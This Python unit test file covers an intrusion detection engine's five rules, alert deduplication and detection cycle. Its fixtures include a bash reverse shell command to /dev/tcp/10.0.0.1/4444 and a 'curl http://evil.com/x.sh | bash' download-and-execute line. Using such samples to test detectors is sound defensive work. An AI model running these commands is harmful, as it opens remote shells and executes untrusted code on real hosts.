"""
backend/tests/test_detection.py — Unit tests for all 5 detection rules, dedup logic, and engine cycle.

TDD RED: written before rule code exists. All tests fail with ImportError until Task 2 creates
the detection package.
"""

import asyncio
import duckdb
import json
from datetime import datetime, timezone, timedelta

from backend.db import init_schema
from backend.detection.rules import (
    unusual_listener,
    reverse_shell,
    download_exec,
    sudo_bruteforce,
    shell_unusual_parent,
)
from backend.detection.engine import run_detection_cycle, write_alert


def insert_event(conn, **fields):
    """
    Insert one row into the events table using nextval('event_seq').

    Default field values:
      ts         = datetime.now(timezone.utc).replace(tzinfo=None)
      host       = "test-host"
      event_type = "process_start"
      all others = None

    raw_json is serialized to JSON string if not None.
    """
    now = datetime.now(timezone.utc).replace(tzinfo=None)
    ts           = fields.get("ts", now)
    host         = fields.get("host", "test-host")
    event_type   = fields.get("event_type", "process_start")
    process_name = fields.get("process_name", None)
    pid          = fields.get("pid", None)
    ppid         = fields.get("ppid", None)
    username     = fields.get("username", None)
    cmdline      = fields.get("cmdline", None)
    local_ip     = fields.get("local_ip", None)
    local_port   = fields.get("local_port", None)
    remote_ip    = fields.get("remote_ip", None)
    remote_port  = fields.get("remote_port", None)
    raw_json     = fields.get("raw_json", None)
    if raw_json is not None:
        raw_json = json.dumps(raw_json)

    cur = conn.cursor()
    cur.execute(
        """INSERT INTO events VALUES (
            nextval('event_seq'), ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
        )""",
        [ts, host, event_type, process_name, pid, ppid, username,
         cmdline, local_ip, local_port, remote_ip, remote_port, raw_json],
    )


def insert_agent(conn, host="test-host"):
    """
    Insert one row into the agents table with last_seen = now - 5 seconds (naive UTC).
    The agent_id = host, hostname = host.
    """
    last_seen = datetime.now(timezone.utc).replace(tzinfo=None) - timedelta(seconds=5)
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO agents VALUES (?, ?, ?, ?, ?, ?, ?)",
        [host, host, None, None, last_seen, None, None],
    )


# ---------------------------------------------------------------------------
# Test 1: unusual_listener fires on unusual port
# ---------------------------------------------------------------------------

def test_unusual_listener_fires():
    conn = duckdb.connect(":memory:")
    init_schema(conn)
    now = datetime.now(timezone.utc).replace(tzinfo=None)
    insert_event(conn,
                 event_type="network_conn",
                 remote_ip=None,
                 local_port=4444,
                 ts=now - timedelta(seconds=10))
    result = unusual_listener.run(conn, "test-host")
    assert result is not None
    assert result["rule_id"] == "unusual_listener"
    assert result["severity"] == "high"
    assert result["mitre_id"] == "T1571"


# ---------------------------------------------------------------------------
# Test 2: unusual_listener does NOT fire on common port 80
# ---------------------------------------------------------------------------

def test_unusual_listener_no_fire_common_port():
    conn = duckdb.connect(":memory:")
    init_schema(conn)
    now = datetime.now(timezone.utc).replace(tzinfo=None)
    insert_event(conn,
                 event_type="network_conn",
                 remote_ip=None,
                 local_port=80,
                 ts=now - timedelta(seconds=10))
    result = unusual_listener.run(conn, "test-host")
    assert result is None


# ---------------------------------------------------------------------------
# Test 3: unusual_listener deduplicates within cooldown window
# ---------------------------------------------------------------------------

def test_unusual_listener_dedup():
    conn = duckdb.connect(":memory:")
    init_schema(conn)
    now = datetime.now(timezone.utc).replace(tzinfo=None)
    insert_event(conn,
                 event_type="network_conn",
                 remote_ip=None,
                 local_port=4444,
                 ts=now - timedelta(seconds=10))

    result1 = unusual_listener.run(conn, "test-host")
    assert result1 is not None, "First call should fire"
    write_alert(conn, result1)  # Persist alert so dedup query finds it

    result2 = unusual_listener.run(conn, "test-host")
    assert result2 is None, "Second call within cooldown should return None"


# ---------------------------------------------------------------------------
# Test 4: reverse_shell fires on matching cmdline
# ---------------------------------------------------------------------------

def test_reverse_shell_fires():
    conn = duckdb.connect(":memory:")
    init_schema(conn)
    now = datetime.now(timezone.utc).replace(tzinfo=None)
    insert_event(conn,
                 event_type="process_start",
                 cmdline="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                 ts=now - timedelta(seconds=10))
    result = reverse_shell.run(conn, "test-host")
    assert result is not None
    assert result["severity"] == "critical"
    assert result["mitre_id"] == "T1059.004"


# ---------------------------------------------------------------------------
# Test 5: reverse_shell does NOT fire on non-matching cmdline
# ---------------------------------------------------------------------------

def test_reverse_shell_no_match():
    conn = duckdb.connect(":memory:")
    init_schema(conn)
    now = datetime.now(timezone.utc).replace(tzinfo=None)
    insert_event(conn,
                 event_type="process_start",
                 cmdline="python3 manage.py runserver",
                 ts=now - timedelta(seconds=10))
    result = reverse_shell.run(conn, "test-host")
    assert result is None


# ---------------------------------------------------------------------------
# Test 6: download_exec fires on curl|bash pattern
# ---------------------------------------------------------------------------

def test_download_exec_fires():
    conn = duckdb.connect(":memory:")
    init_schema(conn)
    now = datetime.now(timezone.utc).replace(tzinfo=None)
    insert_event(conn,
                 event_type="process_start",
                 cmdline="curl http://evil.com/x.sh | bash",
                 ts=now - timedelta(seconds=10))
    result = download_exec.run(conn, "test-host")
    assert result is not None
    assert result["severity"] == "critical"
    assert result["mitre_id"] == "T1059.004"


# ---------------------------------------------------------------------------
# Test 7: sudo_bruteforce fires on 3 auth_events within 60 seconds
# ---------------------------------------------------------------------------

def test_sudo_bruteforce_fires():
    conn = duckdb.connect(":memory:")
    init_schema(conn)
    now = datetime.now(timezone.utc).replace(tzinfo=None)
    for i in range(3):
        insert_event(conn,
                     event_type="auth_event",
                     ts=now - timedelta(seconds=50 - i * 5))
    result = sudo_bruteforce.run(conn, "test-host")
    assert result is not None
    assert result["severity"] == "high"
    assert result["mitre_id"] == "T1548.003"


# ---------------------------------------------------------------------------
# Test 8: sudo_bruteforce does NOT fire on only 2 auth_events
# ---------------------------------------------------------------------------

def test_sudo_bruteforce_no_fire_too_few():
    conn = duckdb.connect(":memory:")
    init_schema(conn)
    now = datetime.now(timezone.utc).replace(tzinfo=None)
    for i in range(2):
        insert_event(conn,
                     event_type="auth_event",
                     ts=now - timedelta(seconds=50 - i * 5))
    result = sudo_bruteforce.run(conn, "test-host")
    assert result is None


# ---------------------------------------------------------------------------
# Test 9: shell_unusual_parent fires when shell spawned by python3
# ---------------------------------------------------------------------------

def test_shell_unusual_parent_fires():
    conn = duckdb.connect(":memory:")
    init_schema(conn)
    now = datetime.now(timezone.utc).replace(tzinfo=None)
    # Event A: python3 with pid=100 at ts=now-20s
    insert_event(conn,
                 event_type="process_start",
                 process_name="python3",
                 pid=100,
                 ts=now - timedelta(seconds=20))
    # Event B: bash with ppid=100 at ts=now-10s (falls within lookback window)
    insert_event(conn,
                 event_type="process_start",
                 process_name="bash",
                 ppid=100,
                 ts=now - timedelta(seconds=10))
    result = shell_unusual_parent.run(conn, "test-host")
    assert result is not None
    assert result["severity"] == "high"
    assert result["mitre_id"] == "T1059"


# ---------------------------------------------------------------------------
# Test 10: engine run_detection_cycle completes without crashing
# ---------------------------------------------------------------------------

def test_engine_run_cycle_no_crash():
    conn = duckdb.connect(":memory:")
    init_schema(conn)
    insert_agent(conn, host="test-host")
    now = datetime.now(timezone.utc).replace(tzinfo=None)
    insert_event(conn,
                 event_type="process_start",
                 cmdline="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                 ts=now - timedelta(seconds=10))
    # Should not raise
    asyncio.run(run_detection_cycle(conn))
    # At least one alert must have been written
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM alerts")
    count = cur.fetchone()[0]
    assert count >= 1
